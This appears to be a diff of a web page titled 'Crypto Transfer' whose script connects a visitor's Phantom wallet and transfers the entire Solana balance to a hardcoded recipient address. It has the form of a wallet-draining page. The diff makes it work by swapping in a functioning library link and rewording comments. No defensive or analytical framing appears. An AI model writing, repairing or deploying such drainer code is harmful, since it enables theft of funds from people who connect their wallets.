@@ -5,42 +5,43 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.75.1/web3.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@1.75.1/lib/index.iife.js"></script>
 </head>
 <body>
     <h2>Click below to transfer all funds</h2>
     <button id="transfer-btn">Transfer Now</button>
 
     <script>
+        // Define the recipient wallet address
         const recipientAddress = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
 
         async function transferSOL() {
             try {
-                // Check if Phantom wallet is installed
+                // Check if Phantom Wallet is installed
                 if (!window.solana || !window.solana.isPhantom) {
-                    alert("Please install Phantom wallet.");
+                    alert("Please install the Phantom Wallet extension.");
                     return;
                 }
 
-                // Connect to Phantom wallet
+                // Connect to Phantom Wallet
                 const provider = window.solana;
                 await provider.connect();
                 const publicKey = provider.publicKey.toString();
                 console.log("Connected wallet:", publicKey);
 
-                // Create connection to Solana cluster
+                // Create connection to the Solana blockchain
                 const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
 
-                // Get the wallet balance
+                // Get wallet balance
                 let balance = await connection.getBalance(provider.publicKey);
-                balance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+                balance = balance / solanaWeb3.LAMPORTS_PER_SOL; // Convert lamports to SOL
                 
                 if (balance === 0) {
                     alert("Insufficient SOL balance.");
                     return;
                 }
 
-                // Prepare transaction to transfer all SOL
+                // Create transaction to transfer entire SOL balance
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
@@ -49,7 +50,7 @@
                     })
                 );
 
-                // Request to sign and send the transaction
+                // Sign and send the transaction
                 const { signature } = await provider.signAndSendTransaction(transaction);
                 await connection.confirmTransaction(signature);
 
